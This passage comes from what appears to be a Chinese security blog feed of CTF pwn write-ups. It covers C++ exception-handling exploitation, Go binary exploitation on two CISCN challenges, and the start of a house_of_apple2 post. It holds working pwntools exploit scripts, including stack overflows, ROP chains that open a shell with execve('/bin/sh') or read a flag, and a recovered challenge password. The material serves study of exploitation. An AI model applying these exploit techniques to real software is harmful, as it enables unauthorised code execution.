<code>catch</code> 块。</li>
<li>如果找到匹配的 <code>catch</code>
块，栈展开停止，控制权转移到该块。</li>
</ul>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2024/09/21/Exploits-under-exception-handling/image-20240921170552763.png"
                      class=""
                >
<p>从这个函数跳转出来后，会进入<code>0x4019a1</code>这里执行，我们对照IDA中的内容会发现这里实质上是<code>cleanup</code>这个子函数，该函数的主要功能如下：</p>
<ul>
<li><p>在栈展开的过程中，每个栈帧可能包含需要执行的清理操作（如调用析构函数）。</p></li>
<li><p>如果 <code>_Unwind_RaiseException</code> 确定某个栈帧不包含匹配的
<code>catch</code>
块，但需要进行清理操作，会调用与该栈帧关联的清理函数。这个清理函数通常会执行栈帧中需要的析构函数或者其他资源释放操作。</p></li>
<li><p>IDA 中识别为 <code>cleanup()</code>
的函数，就是这些清理操作的函数，它用于处理抛出异常过程中需要释放的资源。</p></li>
</ul>
<p>这个vuln函数的命名是因为我一开始以为这个莫名其妙的无作为的函数是解题的关键，但通过以上的理解，其实这个函数更有可能是执行清理的具体函数，但由于该栈帧中没有需要清理的内容，所以显示为空。</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2024/09/21/Exploits-under-exception-handling/image-20240921170608549.png"
                      class=""
                >
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2024/09/21/Exploits-under-exception-handling/image-20240921170616808.png"
                      class=""
                >
<p>然后会调用<code>__Unwind_Resume</code>，这个函数是 C++
异常处理机制中的一个重要函数，它用于在栈展开过程中恢复异常处理的流程，通常在执行完清理操作后继续展开栈帧。在该函数的末尾，我们发现我们的rbp实际已经被赋值为了想要的值。</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2024/09/21/Exploits-under-exception-handling/image-20240921170639538.png"
                      class=""
                >
<p>但该题目与视频中的那道题最大的不同是，在将rbp控制后，没有机会进行leave;ret了，主函数是一个死循环，退出循环的方式是选项3直接调用exit退出。那么我们就没有机会打栈迁移了。</p>
<p>那么我们需要利用新的方法，这时我参考了<a class="link"   href="https://qanux.github.io/2024/08/28/%E7%BE%8A%E5%9F%8E%E6%9D%AF%202024%20pwn%20writeup/index.html"  title="" target="">羊城杯 2024 pwn writeup<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a>这篇wp中给的解法，发现程序中有很多地方另有玄机。其实程序中还有很多try,catch的组合，在没有被调用的函数中。</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2024/09/21/Exploits-under-exception-handling/image-20240921170659736.png"
                      class=""
                >
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2024/09/21/Exploits-under-exception-handling/image-20240921170739062.png"
                      class=""
                >
<p>什么？程序中居然有catch段中存在对system函数的调用！后面我们通过调试其实可以发现上面打印的错误信息的参数存在src中，正常会打印出Buffer
Overflow这个信息，而且0x4040a0也会做为system的参数。更巧的是，一直被我们忘在一边的trace函数中边界处理不当，当i=8时，实际可以往src处写入0x10个字节。那么我们就可以把/bin/sh写入src中，然后想办法把程序控制流转向这个catch块。</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2024/09/21/Exploits-under-exception-handling/image-20240921170749201.png"
                      class=""
                >
<p>这里我们的问题又回到了如何劫持程序控制流，参考exp可以发现，是通过覆盖该函数栈帧的返回地址为0x401bc7来劫持的。那么结合前面所分析的函数调用链，其实我们可以这样子从大体上理解：出现调用cleanup是因为当前栈帧不匹配catch块，所以要进行清理，之后用<code>__unwind_resume</code>继续找匹配的catch块时，由于返回地址被改为了一个catch块的handler，所以可以直接匹配执行。要深入理解为什么改返回地址可行，我们可以通过追踪rcx值的变化实现，因为最后从<code>__unwind_resume</code>跳转到目标地址是通过<code>mov rsp,rcx;pop rcx;jmp rcx</code>实现的。提取出与rcx变化有关的指令按顺序如下：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;_Unwind_Resume+316&gt; call 0x7fa75620d6a0</span><br><span class="line">...</span><br><span class="line">&lt;_Unwind_Resume+337&gt; call 0x7fb2f2d9dc20</span><br><span class="line">...</span><br><span class="line">&lt;_Unwind_Resume+402&gt; mov rcx, rax	#实际获取了上一个函数的返回值</span><br><span class="line">...</span><br><span class="line">&lt;_Unwind_Resume+414&gt; lea rcx, [rbp + rcx + 8]</span><br><span class="line">...</span><br><span class="line">&lt;_Unwind_Resume+447&gt; mov rsp,rcx</span><br><span class="line">&lt;_Unwind_Resume+450&gt; pop rcx</span><br><span class="line">&lt;_Unwind_Resume+451&gt; jmp rcx</span><br></pre></td></tr></table></figure></div>
<p>我们可以再跟进<code>0x7fb2f2d9dc20</code>看一下，发现只是对rdx做了一些改变，要再往前找。而前面的<code>0x7fa75620d6a0</code>执行后恰好使rax变为0x90，和后面赋给rcx值时的rax值相同，说明该函数是关键，进去看看。</p>
<p>其中的逻辑相当复杂，但在有个17次的循环后，有看到原来栈帧的返回地址，而执行过程中rbp始终为0x7ffcc254a5b0，_Unwind_Resume函数开始调用时也并没有改变rbp的值，这里rax实际能计算出一个当前rbp到处理栈帧返回地址附近的一个偏移，然后最后就能使rcx成为返回地址处的内容并跳转过去当作目标catch的handler函数进行执行。</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2024/09/21/Exploits-under-exception-handling/image-20240921170800205.png"
                      class=""
                >
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2024/09/21/Exploits-under-exception-handling/image-20240921170811667.png"
                      class=""
                >
<p>其实这和正常的栈溢出有点像，那我们不禁想如果覆盖成别的其他不属于handler的地址会如何呢？比如我们把返回地址覆盖为main试试，结果是会报出**terminate
called after throwing an instance of
‘char*’**，因为异常没有正常匹配。</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2024/09/21/Exploits-under-exception-handling/image-20240921170824548.png"
                      class=""
                >
<p>然后我们可以试试换一个catch(int)的handler进行匹配，发现会有如下错误，rdx是由前面<code>mov  rdx, qword ptr [rdx]</code>得到的，前面的rdx值为0x404208，也就是我们可控的地址，我们可以输入一个合法的地址进去看看。最后还是会报**terminate
called after throwing an instance of
‘char*’**。后面看了别人博客才发现这个匹配的流程需要一定的经验。其他函数的catch块对应不上。</p>
<blockquote>
<p>将ret地址修改为backdoor函数的try块地址范围内<code>0x401252-0x401258</code>(在我的测试中发现，这个范围是个左开但是右侧不精确的范围，为了保证成功率可以使用左测边界+1的地址)。</p>
</blockquote>
<p>我们这里的try块的范围是从0x0000000000401BC2到0x0000000000401BC7的，最终能打通的范围也的确是0x0000000000401BC3到0x0000000000401BC7。</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2024/09/21/Exploits-under-exception-handling/image-20240921170839585.png"
                      class=""
                >
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2024/09/21/Exploits-under-exception-handling/image-20240921170848861.png"
                      class=""
                >
<p>之后还需要注意的一点是，最后进入目标handler后，存在一个<code>mov qword ptr [rbp - 0x18], rax</code>的赋值，我们需要确保覆盖的rbp的值减去0x18后为一个可写的地址，否则会出错。</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2024/09/21/Exploits-under-exception-handling/image-20240921170859003.png"
                      class=""
                >
<p>最终exp如下：</p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch=<span class="string">&quot;amd64&quot;</span>,log_level=<span class="string">&quot;debug&quot;</span>)</span><br><span class="line">p = process(<span class="string">&quot;pwn&quot;</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">trace</span>(<span class="params">data,choice=<span class="string">&quot;n&quot;</span></span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Your chocie:&quot;</span>,<span class="string">&quot;1&quot;</span>)</span><br><span class="line">    p.sendafter(<span class="string">&quot;You can record log details here:&quot;</span>,data)</span><br><span class="line">    p.sendafter(<span class="string">&quot;Do you need to check the records?&quot;</span>,choice)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">warn</span>(<span class="params">data</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Your chocie:&quot;</span>,<span class="string">&quot;2&quot;</span>)</span><br><span class="line">    p.sendafter(<span class="string">&quot;Type your message here plz:&quot;</span>,data)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">exit</span>():</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Your chocie:&quot;</span>,<span class="string">&quot;3&quot;</span>)</span><br><span class="line">magic = <span class="number">0x0000000000401BC7</span></span><br><span class="line">fake_rbp = <span class="number">0x404200</span>     <span class="comment">#只要其-0x18处可写就行</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">9</span>):</span><br><span class="line">    trace(<span class="string">b&quot;/bin/sh\x00&quot;</span>*<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&quot;A&quot;</span>*<span class="number">0x70</span> + p64(fake_rbp) + p64(magic)</span><br><span class="line">warn(payload)</span><br><span class="line">p.interactive()</span><br><span class="line">                             </span><br></pre></td></tr></table></figure></div>
<h4 id="总结">总结</h4>
<ul>
<li>主要调用链为<code>__cxa_throw</code>-&gt;<code>_Unwind_RaiseException</code>-&gt;<code>clearup</code>-&gt;<code>_Unwind_Resume</code>-&gt;<code>对应catch块的handler函数</code></li>
<li>除了CHOP，有两处漏洞可以利用
<ul>
<li>覆盖rbp进行栈迁移（有leave;ret可供使用）</li>
<li>覆盖返回地址到其他handler函数</li>
</ul></li>
</ul>
<h4 id="参考内容">参考内容</h4>
<ul>
<li>https://blog.csdn.net/jennycisp/article/details/134965719</li>
<li>https://www.bilibili.com/video/BV1eE421L7ZE/</li>
<li>https://qanux.github.io/2024/08/28/%E7%BE%8A%E5%9F%8E%E6%9D%AF%202024%20pwn%20writeup/index.html</li>
</ul>
]]></content>
      <categories>
        <category>pwn</category>
      </categories>
      <tags>
        <tag>pwn</tag>
        <tag>exception</tag>
      </tags>
  </entry>
  <entry>
    <title>gopwn初探</title>
    <url>/blog/2024/09/22/go-pwn/</url>
    <content><![CDATA[<h4 id="go-pwn的特点">go pwn的特点</h4>
<ul>
<li><strong>Golang</strong> 使用了自己的运行时和内存管理机制。Go
的堆栈是可扩展的（split-stack model），即每个 Goroutine
的堆栈大小可以动态扩展。这使得堆栈布局更加复杂，和固定大小的堆栈相比更难预测。</li>
<li>无标准栈帧，也就是不怎么依靠rbp作为栈帧指针（但实际那个位置有时还是维护rbp），通常通过rsp进行局部变量寻址。</li>
<li>Go 语言依赖垃圾回收器管理内存，而 C/C++
依赖程序员手动管理内存。这意味着在 Go 程序中，利用内存分配漏洞（如 UAF
或 double free）时，必须考虑到垃圾回收器的行为。</li>
<li>Go 语言的异常处理机制是通过 <code>panic</code> 和
<code>recover</code> 完成的，而不像 C/C++ 使用
<code>setjmp/longjmp</code> 或 C++
的异常捕获机制。这导致堆栈结构和控制流的变化更为复杂，特别是在发生
<code>panic</code> 后。在漏洞利用过程中，如果程序进入了
<code>panic</code> 状态，控制流会被重定向，这可能干扰漏洞利用过程。</li>
<li>Go 的堆内存管理机制不同于标准的
<code>malloc</code>/<code>free</code>。Go
运行时会使用自己的内存分配器，而不是像传统 C/C++ 程序中依赖系统的
<code>malloc</code> 和 <code>free</code>。这意味着许多针对 C/C++
堆的利用技术，如 <code>fastbin attack</code>、<code>tcache</code>
等，不适用于 Go 程序。</li>
</ul>
<h4 id="栈扩展机制">栈扩展机制</h4>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">a:</span><br><span class="line">lea     r12, [rsp+var_218]			</span><br><span class="line">cmp     r12, [r14+10h]				//上面两句也有可能是cmp rsp, [r14+10h]这种形式</span><br><span class="line">jbe     loc_4C18C0</span><br><span class="line">......</span><br><span class="line">loc_4C18C0:</span><br><span class="line">mov     [rsp+arg_0], rax</span><br><span class="line">mov     [rsp+arg_8], rbx</span><br><span class="line">mov     [rsp+arg_10], rcx</span><br><span class="line">call    runtime_morestack_noctxt</span><br><span class="line">mov     rax, [rsp+arg_0]</span><br><span class="line">mov     rbx, [rsp+arg_8]</span><br><span class="line">mov     rcx, [rsp+arg_10]</span><br><span class="line">jmp     a</span><br></pre></td></tr></table></figure></div>
<p>r14+0x10地址处存的就是当前栈段的上限信息，不够时会调用runtime_morestack_noctxt进行扩展。call一个函数时与c同样会把返回地址存到栈上，在栈扩展中也会维护好这个返回地址的位置。而每次栈扩展出的新栈与原来的栈是不连续的，但一个栈段只要大小没有耗尽，也可以存多个函数的栈帧。</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2024/09/22/go-pwn/image-20240922202642330.png"
                      class=""
                >
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2024/09/22/go-pwn/image-20240922202650340.png"
                      class=""
                >
<p>可以看到这里的栈实际不在x86_64常使用的栈段中。而且确实会把返回地址压入栈。</p>
<h4 id="传参顺序">传参顺序</h4>
<p>传参用到的寄存器依次是：AX，BX，CX，DI，SI，R8，R9，R10，R11</p>
<h4 id="题目分析">题目分析</h4>
<h5 id="ciscn-2023-初赛shallwego">[CISCN 2023 初赛]shallwego</h5>
<p>先运行一下看看：</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2024/09/22/go-pwn/image-20240922202702201.png"
                      class=""
                >
<p>发现提供了一个shell窗口，但好像要先对cert进行一些操作。看IDA反汇编结果，其中在<strong>main_unk_func0b05</strong>有很多可疑的字符串，经整理大概有如下那么多：</p>
<div class="highlight-container" data-rel="Txt"><figure class="iseeu highlight txt"><table><tr><td class="code"><pre><span class="line">nAcDsMicN</span><br><span class="line"></span><br><span class="line">echo</span><br><span class="line">exit</span><br><span class="line">cert</span><br><span class="line">cd</span><br><span class="line">cat flag</span><br><span class="line">ls -al</span><br><span class="line">whoami</span><br></pre></td></tr></table></figure></div>
<p>其中很多都是命令，有一个字符串是在cert命令后检测的。我们通过动态调试能够发现，r8实际存的是命令（不包括操作符）的长度，rbx存的是输入的整个命令被空格分隔的段数。那我们就可以先执行个
<code>cert nAcDsMicN abcdefg</code> 动调看看。</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2024/09/22/go-pwn/image-20240922202742958.png"
                      class=""
                >
<p>之后会进入 <strong>main_unk_func0b01</strong>
中，这里实际对我们输入的第三段（其实这里我们已经可以看作大概是<code>cert 用户名 密码</code>这样一个认证过程）进行加密，与一个写死的字符串进行比较，而且rc4加密的密钥也直接写在程序中了。那么我们就可以先将密文base64解码后，把得到的内容当作密码输入进去，然后看rc4加密后的结果，这个结果就是正确的密码了，因为rc4是对称加密算法。最终得到的密码值为<strong>S33UAga1n@#!</strong></p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2024/09/22/go-pwn/image-20240922202759540.png"
                      class=""
                >
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2024/09/22/go-pwn/image-20240922202808837.png"
                      class=""
                >
<p>然后shell提示符就会变成 <code>nightingale#</code>
，之后也可以正常调用其他的设置好的命令，但给的那几个命令都不能直接获取真实flag的值，需要再次寻找漏洞点。经过分析发现别的命令都没什么问题，唯独echo这个命令有两段函数专门处理。并且能打印出我们输入的内容，可以尝试进行栈溢出。</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2024/09/22/go-pwn/image-20240922202821181.png"
                      class=""
                >
<p>看到这兴奋起来了，因为这里往栈上写了0x75，也就是u，看来是要开始将输入内容存到栈上了。我们的返回地址在<strong>0xc00011adc8</strong>，而输入从<strong>0xc00011ab98</strong>开始存，其中间隔了0x230个字节。然后这个循环中实际有<code>cmp dl, '+'</code>这个条件判断，如果满足会直接调回去自增rax，也就是循环中的下标自增，直接跳过了后面往栈上写的部分。</p>
<p>那我们先试试echo 0x230字节的垃圾字符看看。</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2024/09/22/go-pwn/image-20240922202832431.png"
                      class=""
                >
<p>发现这里最后rdx大于0x200，就直接略过了将值赋值到栈上的操作。说明单次输入不能超过0x200字节，那如果我们在输入中间加入空格呢？</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2024/09/22/go-pwn/image-20240922202844042.png"
                      class=""
                >
<p>这次成功跳过了大小的检测，再往下执行看看效果。</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2024/09/22/go-pwn/image-20240922202852228.png"
                      class=""
                >
<p>然后发现直接崩掉了，因为rax是一个下标，所以推断是rbx被更改了以至于赋值失败，那么rbx是在哪里被赋值的呢。实际前面有一句<code>mov rbx, [rsp+298h+var_20]</code>,也就是这个rbx基址是存在<strong>ret_addr-0x20</strong>处的。那我们不能更改这个位置的值，但我们又无法获知这个位置的值，该怎么办呢？很巧的是，程序刚好碰到+会跳过赋值，所以我们可以用8个+来保存rbx。其实也不必那么麻烦，直接全用+填充，最后再覆盖也行。然后就能成功覆盖返回地址，但这里这个填充字符数有点迷，最后我本地动调后填充了0x229个字节后才覆盖到返回地址。</p>
<p>之后是正常的ROP，因为有syscall，就先把/bin/sh读取到一个地方，然后再用execve调用打即可。最后复现时本地能够用execve通，但远程却有问题，只能拿orw打，不知道是为什么。</p>
<h6 id="exp">exp</h6>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line">context(arch=<span class="string">&quot;amd64&quot;</span>,log_level=<span class="string">&quot;debug&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 你的 Base64 编码字符串</span></span><br><span class="line">encoded_str = <span class="string">&quot;JLIX8pbSvYZu/WaG&quot;</span></span><br><span class="line"><span class="comment"># 进行 Base64 解码</span></span><br><span class="line">decoded_bytes = base64.b64decode(encoded_str)</span><br><span class="line"><span class="comment"># 打印解码后的字节字符串</span></span><br><span class="line"><span class="built_in">print</span>(decoded_bytes)</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&#x27;./service&#x27;</span>)</span><br><span class="line"><span class="comment">#p = remote(&quot;node4.anna.nssctf.cn&quot;,28629)</span></span><br><span class="line">passwd = <span class="string">b&quot;S33UAga1n@#!&quot;</span></span><br><span class="line">payload = <span class="string">b&quot;cert nAcDsMicN &quot;</span> + passwd</span><br><span class="line">p.sendlineafter(<span class="string">&quot;shell$&quot;</span>,payload)</span><br><span class="line">pop_rdi_ret = <span class="number">0x0000000000444fec</span></span><br><span class="line">pop_rsi_ret = <span class="number">0x000000000041e818</span></span><br><span class="line">pop_rdx_ret = <span class="number">0x000000000049e11d</span></span><br><span class="line">pop_rax_ret = <span class="number">0x000000000040d9e6</span></span><br><span class="line">syscall = <span class="number">0x000000000040328c</span></span><br><span class="line">ret = <span class="number">0x000000000040103d</span></span><br><span class="line">main = <span class="number">0x00000000004C1D60</span></span><br><span class="line">data = <span class="number">0x5A34A0</span></span><br><span class="line">payload = (<span class="string">b&quot;echo &quot;</span>.ljust(<span class="number">0x1f0</span>,<span class="string">b&quot;A&quot;</span>) + <span class="string">b&quot; &quot;</span>).ljust(<span class="number">0x229</span>,<span class="string">b&quot;+&quot;</span>) + p64(pop_rax_ret) + p64(<span class="number">0</span>) + p64(pop_rdi_ret) + p64(<span class="number">0</span>) + p64(pop_rsi_ret) + p64(data) + p64(pop_rdx_ret) + p64(<span class="number">0x8</span>) + p64(syscall)</span><br><span class="line">payload += p64(pop_rax_ret) + p64(<span class="number">2</span>) + p64(pop_rdi_ret) + p64(data) + p64(pop_rsi_ret) + p64(<span class="number">0</span>) + p64(pop_rdx_ret) + p64(<span class="number">0</span>) + p64(syscall) </span><br><span class="line">payload += p64(pop_rax_ret) + p64(<span class="number">0</span>) + p64(pop_rdi_ret) + p64(<span class="number">3</span>) + p64(pop_rsi_ret) + p64(data) + p64(pop_rdx_ret) + p64(<span class="number">0x40</span>) + p64(syscall)</span><br><span class="line">payload += p64(pop_rax_ret) + p64(<span class="number">1</span>) + p64(pop_rdi_ret) + p64(<span class="number">1</span>) + p64(pop_rsi_ret) + p64(data) + p64(pop_rdx_ret) + p64(<span class="number">0x40</span>) + p64(syscall)</span><br><span class="line"><span class="comment">#+ p64(pop_rax_ret) + p64(0x3b) + p64(pop_rdi_ret) + p64(data) + p64(pop_rsi_ret) + p64(0) + p64(pop_rdx_ret) + p64(0) + p64(syscall) + p64(main)</span></span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&quot;nightingale#&quot;</span>,payload)</span><br><span class="line">pause()</span><br><span class="line">p.send(<span class="string">&quot;/flag\x00&quot;</span>)</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
<h5 id="ciscn-2024-初赛gostack">[CISCN 2024 初赛]gostack</h5>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2024/09/22/go-pwn/image-20240922202922399.png"
                      class=""
                >
<p>先运行一遍找提示字符串，看到调用位置在main_func3，直接gdb打断点进去调试一下。发现输入存在如下位置，但是存在栈上的是指针，没什么用。</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2024/09/22/go-pwn/image-20240922202932191.png"
                      class=""
                >
<p>之后还会把数据写到栈的另一个地方，这里直接把内容复制到栈上了，并且没有检测加跳转，可能会有溢出。</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2024/09/22/go-pwn/image-20240922202943137.png"
                      class=""
                >
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2024/09/22/go-pwn/image-20240922202953894.png"
                      class=""
                >
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2024/09/22/go-pwn/image-20240922203005886.png"
                      class=""
                >
<p>然后我们再看看程序的其他部分，其中有个<strong>main_executeCommand</strong>函数引入注目，其中有如下两个子函数：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">call    os_exec_Command</span><br><span class="line">...</span><br><span class="line">call    os_exec__ptr_Cmd_Run</span><br></pre></td></tr></table></figure></div>
<p>其中前者用于创建一个 <code>Cmd</code>
对象，后者用于执行真正的命令。</p>
<p>那么我们试试直接填充0x1d0字节，然后把返回地址覆盖为<strong>main_executeCommand</strong>地址。结果会在最后<code>fmt_Fprintf-&gt;fmt__ptr_pp_doPrintf-&gt;fmt__ptr_pp_printArg-&gt;fmt__ptr_pp_fmtString-&gt;fmt__ptr_fmt_fmtS-&gt;fmt__ptr_fmt_padString-&gt;runtime_growslice</code>这个调用链然后gopanic退出，其提示信息为<code>"growslice: cap out of rangeinternal loc"...</code>，也就是说Go
语言在处理切片（slice）扩容时，发生容量超出合理范围时的一个运行时错误。</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">0x449852    mov    rdi, rsi                        RDI =&gt; 0x4141414141414155 (&#x27;UAAAAAAA&#x27;)</span><br><span class="line">......</span><br><span class="line">0x449939    movabs r8, 0x1000000000000         R8 =&gt; 0x1000000000000</span><br><span class="line">0x449943    cmp    rsi, r8                     0x4141414141414155 - 0x1000000000000     EFLAGS =&gt; 0x206 [ cf PF af zf sf IF df of ]</span><br><span class="line">0x449946    seta   r9b</span><br><span class="line">0x44994a    mov    rsi, rcx                    RSI =&gt; 0x14</span><br><span class="line">0x44994d    mov    r10, rdx                    R10 =&gt; 0x4141414141416000</span><br><span class="line">0x449950    jmp    0x449c69                    &lt;0x449c69&gt;</span><br><span class="line">↓</span><br><span class="line">0x449c69    test   r9b, r9b     1 &amp; 1     EFLAGS =&gt; 0x202 [ cf pf af zf sf IF df of ]</span><br><span class="line">0x449c6c  ✔ jne    0x449d4d                    &lt;0x449d4d&gt;</span><br></pre></td></tr></table></figure></div>
<p>我们稍微往前看就可以发现这里rsi和r8的比较实际上应该就是判断切片大小，而存大小的位置被我们覆盖成为了一堆A。也就是说我们破坏了<code>fmt_Fprintf</code>的一些参数。那我们就打断点在这个函数处看看哪些参数被覆盖成了一堆A。rdx很可疑。但前面调用<code>runtime_convTstring</code>后就没有动过rdx了，这个<code>runtime_convTstring</code>函数也比较短，可以跟进去看看。</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2024/09/22/go-pwn/image-20240922203024108.png"
                      class=""
                >
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2024/09/22/go-pwn/image-20240922203039143.png"
                      class=""
                >
<p>其中唯一修改了rdx的是这一句，这个函数的栈帧在一开始
<code>sub rsp, 20h</code>
扩充的空间，这里是把rsp+0x30处的内容复制过来，而rsp+0x30处内容前面有
<code>mov qword ptr [rsp + 0x30], rbx</code>
的修改，而我们进这个函数前rbx就已经是0x4141414141414141了，还要往前追溯。发现前面刚好有个
<code>mov rbx, [rsp+208h+var_C8]</code>
，也就是说我们不能把这个位置的数值覆盖掉。经过进一步用正常数值调试发现，这个位置存的其实就是我们输入的大小。那么我们可以试试先填充0x108个垃圾字符，然后输入大小，之后再正常填充。</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2024/09/22/go-pwn/image-20240922203058314.png"
                      class=""
                >
<p>前面的判断绕过了，但在fmt函数中还是崩，但这次是rcx的问题。往前找找，发现是这个<code>runtime_memmove</code>函数的第二个参数源地址被覆盖掉了。</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2024/09/22/go-pwn/image-20240922203113527.png"
                      class=""
                >
<p>我们直接把前面要填充的垃圾字符都换成一个可写的地址试试，成功绕过了这个死亡之call，也算是成功地绕过了所有阻碍，终于能劫持控制流返回了（这写了个0x4a0120覆盖返回地址进行测试）。</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2024/09/22/go-pwn/image-20240922203128877.png"
                      class=""
                >
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2024/09/22/go-pwn/image-20240922203145314.png"
                      class=""
                >
<p>后面就可以直接ret2syscall了，这里我本来还想靠<strong>os_exec_Command</strong>玩一下，但还是要先靠read把/bin/sh读到一个地方，不如直接调用execve。需要注意的是这个syscall会后面带着改栈上的内容，如下图这样rop链就会被打断，需要绕一下。</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2024/09/22/go-pwn/image-20240922203202348.png"
                      class=""
                >
<h6 id="exp-1">exp</h6>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch=<span class="string">&quot;amd64&quot;</span>,log_level=<span class="string">&quot;debug&quot;</span>)</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&quot;./gostack&quot;</span>)</span><br><span class="line">bss_add = <span class="number">0x00000000005633C0</span></span><br><span class="line">syscall = <span class="number">0x0000000000404043</span></span><br><span class="line">pop_rdi_5reg_ret = <span class="number">0x00000000004a18a5</span></span><br><span class="line">pop_rsi_ret = <span class="number">0x000000000042138a</span></span><br><span class="line">pop_rdx_ret = <span class="number">0x00000000004944ec</span></span><br><span class="line">pop_rax_ret = <span class="number">0x000000000040f984</span></span><br><span class="line">rop = p64(pop_rdi_5reg_ret) + p64(<span class="number">0</span>)*<span class="number">6</span> + p64(pop_rsi_ret) + p64(bss_add) + p64(pop_rdx_ret) + p64(<span class="number">0x8</span>) + p64(pop_rax_ret) + p64(<span class="number">0</span>) + p64(syscall)</span><br><span class="line">rop += (p64(pop_rdi_5reg_ret) + p64(bss_add)*<span class="number">6</span>)*<span class="number">3</span> + p64(pop_rsi_ret) + p64(<span class="number">0</span>) + p64(pop_rdx_ret) + p64(<span class="number">0</span>) + p64(pop_rax_ret) + p64(<span class="number">0x3b</span>) + p64(syscall)</span><br><span class="line"></span><br><span class="line">payload = (p64(bss_add)*<span class="number">33</span> + p64(<span class="number">0x1d8</span>))+(p64(bss_add)*<span class="number">24</span>) + rop</span><br><span class="line">log.success(<span class="built_in">hex</span>(<span class="built_in">len</span>(payload)))</span><br><span class="line">gdb.attach(p)</span><br><span class="line">pause()</span><br><span class="line">p.sendlineafter(<span class="string">&quot;Input your magic message :&quot;</span>,payload)</span><br><span class="line">p.sendline(<span class="string">&quot;/bin/sh\x00&quot;</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></div>
]]></content>
      <categories>
        <category>pwn</category>
      </categories>
      <tags>
        <tag>pwn</tag>
        <tag>go</tag>
        <tag>ciscn wp</tag>
      </tags>
  </entry>
  <entry>
    <title>house_of_apple2利用手法浅析</title>
    <url>/blog/2024/11/10/house-of-apple2%E5%88%A9%E7%94%A8%E6%89%8B%E6%B3%95%E6%B5%85%E6%9E%90/</url>
    <content><![CDATA[<h4 id="适用版本">适用版本</h4>
<ul>
<li>2.23——至今</li>
</ul>
<h4 id="利用条件">利用条件</h4>
<ul>
<li>能控制_IO_FILE的vtable和_wide_data(一般使用largebin attack)</li>
<li>程序从main函数返回，或者执行exit函数</li>
<li>能泄露libc_base和heap_base</li>
</ul>
<h4 id="利用思路">利用思路</h4>
<ol type="1">
